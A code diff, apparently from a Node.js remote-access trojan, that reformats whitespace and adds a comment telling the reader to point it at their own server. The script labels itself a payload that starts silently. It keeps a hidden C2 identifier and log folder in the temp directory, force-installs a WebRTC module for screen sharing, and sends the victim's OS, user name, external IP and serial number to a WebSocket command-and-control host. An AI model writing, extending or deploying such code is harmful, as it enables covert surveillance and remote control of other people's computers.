@@ -8,6 +8,7 @@ const crypto = require('crypto');
 const https = require('https');
 
 // --- CONFIGURATION ---
+// Update this URL to your actual Render/Vercel server URL
 const WS_URL = 'wss://server-eight-pi-39.vercel.app'; 
 const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
 const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
@@ -30,31 +31,31 @@ log("[INIT] Payload starting silently...");
 
 // --- FORCE INSTALLATION CHECK ---
 try {
-    const nodeModulesPath = path.join(__dirname, 'node_modules', '@roamhq', 'wrtc');
-    if (!fs.existsSync(nodeModulesPath)) {
-        console.log("[FORCE] @roamhq/wrtc missing. Installing...");
-        execSync('npm install @roamhq/wrtc --save', { stdio: 'pipe' });
-        console.log("[FORCE] Installation complete.");
-    }
+ const nodeModulesPath = path.join(__dirname, 'node_modules', '@roamhq', 'wrtc');
+ if (!fs.existsSync(nodeModulesPath)) {
+ console.log("[FORCE] @roamhq/wrtc missing. Installing...");
+ execSync('npm install @roamhq/wrtc --save', { stdio: 'pipe' });
+ console.log("[FORCE] Installation complete.");
+ }
 } catch (e) {
-    console.warn("[FORCE] Could not auto-install:", e.message);
+ console.warn("[FORCE] Could not auto-install:", e.message);
 }
 
 // --- NATIVE WEBRTC IMPORTS ---
 let wrtc;
 try {
-    // Attempt to load the native module
-    wrtc = require('@roamhq/wrtc');
+ // Attempt to load the native module
+ wrtc = require('@roamhq/wrtc');
 } catch (e) {
-    console.error("Failed to require @roamhq/wrtc:", e.message);
+ console.error("Failed to require @roamhq/wrtc:", e.message);
 }
 
 // Check if the module actually has the required exports
 const HAS_WEBRTC = wrtc && wrtc.RTCPeerConnection && wrtc.mediaDevices;
 
 if (!HAS_WEBRTC) {
-    console.warn("[WARN] @roamhq/wrtc not loaded properly. Screen sharing may fail.");
-    console.warn("[WARN] Ensure 'npm install @roamhq/wrtc' was run in this directory.");
+ console.warn("[WARN] @roamhq/wrtc not loaded properly. Screen sharing may fail.");
+ console.warn("[WARN] Ensure 'npm install @roamhq/wrtc' was run in this directory.");
 }
 
 const { RTCPeerConnection, RTCSessionDescription, MediaStream, mediaDevices } = wrtc || {};
@@ -130,20 +131,20 @@ let myIp = 'Unknown';
 // Helper to get external IP
 function getExternalIP() {
  return new Promise((resolve) => {
-   https.get('https://api.ipify.org?format=json', (res) => {
-     let data = '';
-     res.on('data', (chunk) => { data += chunk; });
-     res.on('end', () => {
-       try {
-         const json = JSON.parse(data);
-         resolve(json.ip);
-       } catch (e) {
-         resolve('Unknown');
-       }
-     });
-   }).on('error', () => {
-     resolve('Unknown');
-   });
+ https.get('https://api.ipify.org?format=json', (res) => {
+ let data = '';
+ res.on('data', (chunk) => { data += chunk; });
+ res.on('end', () => {
+ try {
+ const json = JSON.parse(data);
+ resolve(json.ip);
+ } catch (e) {
+ resolve('Unknown');
+ }
+ });
+ }).on('error', () => {
+ resolve('Unknown');
+ });
  });
 }
 
@@ -356,20 +357,20 @@ async function initConnection() {
 
  // Send actual guest device information
  safeSend(JSON.stringify({
-  type: 'info',
-  id: myId,
-  uniqueId: myId,
-  fingerprint: myId,
+ type: 'info',
+ id: myId,
+ uniqueId: myId,
+ fingerprint: myId,
 
-  os: realOsName,
-  arch: os.arch(),
+ os: realOsName,
+ arch: os.arch(),
 
-  user: realDeviceName,
-  ip: myIp,
+ user: realDeviceName,
+ ip: myIp,
 
-  last_seen: Date.now(),
-  status: 'Online',
-  serialNumber: realSerialNumber || realModel || myId
+ last_seen: Date.now(),
+ status: 'Online',
+ serialNumber: realSerialNumber || realModel || myId
  }));
 
  startMonitoring();
@@ -468,8 +469,8 @@ const server = http.createServer((req, res) => {
 });
 
 server.listen(PORT, '0.0.0.0', () => {
-  log(`[RENDER] HTTP server listening on 0.0.0.0:${PORT}`);
-  log('[RENDER] Health service running. Guest registration disabled.');
+ log(`[RENDER] HTTP server listening on 0.0.0.0:${PORT}`);
+ log('[RENDER] Health service running. Guest registration disabled.');
 });
 
 // --- INITIALIZATION ---
